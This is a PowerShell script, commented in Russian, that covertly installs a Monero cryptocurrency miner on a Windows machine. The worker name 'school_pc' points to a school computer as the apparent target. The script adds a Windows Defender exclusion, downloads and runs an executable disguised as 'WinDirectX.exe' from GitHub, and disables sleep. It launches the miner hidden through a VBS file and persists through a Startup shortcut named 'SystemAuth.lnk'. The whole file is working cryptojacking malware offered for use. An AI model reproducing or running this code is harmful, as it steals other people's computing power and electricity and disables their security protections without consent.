$path = "C:\ProgramData\SystemLib"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"

# 1. Полная очистка перед стартом
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue

# 2. Настройка питания (режим 24/7)
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5
powercfg /h off

# 3. Создание папки и исключение антивируса
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }
powershell -Command "Add-MpPreference -ExclusionPath '$path'" -ErrorAction SilentlyContinue

# 4. Загрузка файла
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
} catch { exit }

# 5. Создание файлов запуска (Батник с новыми параметрами)
# Здесь мы добавили --algo rx/0 и --donate-level 1 для стабильности
$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --no-huge-pages --algo rx/0 --donate-level 1 --priority 4"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii

$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 6. Настройка Автозагрузки
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemAuth.lnk")
$Shortcut.TargetPath = "$path\win_start.vbs"
$Shortcut.Save()

# 7. Команда CHECK
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
$CheckFunc = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { 
        Write-Host "СТАТУС: РАБОТАЕТ (ID: `$(`$p.Id))" -ForegroundColor Green 
        Write-Host "Память: `$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB" -ForegroundColor White
    }
    else { Write-Host "СТАТУС: ВЫКЛЮЧЕН" -ForegroundColor Red }
}
"@
$CheckFunc | Out-File -FilePath $ProfilePath -Force

# 8. Финальный запуск
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "Установка 24/7 завершена! Проверь через 'check' через 2-3 минуты." -ForegroundColor Magenta
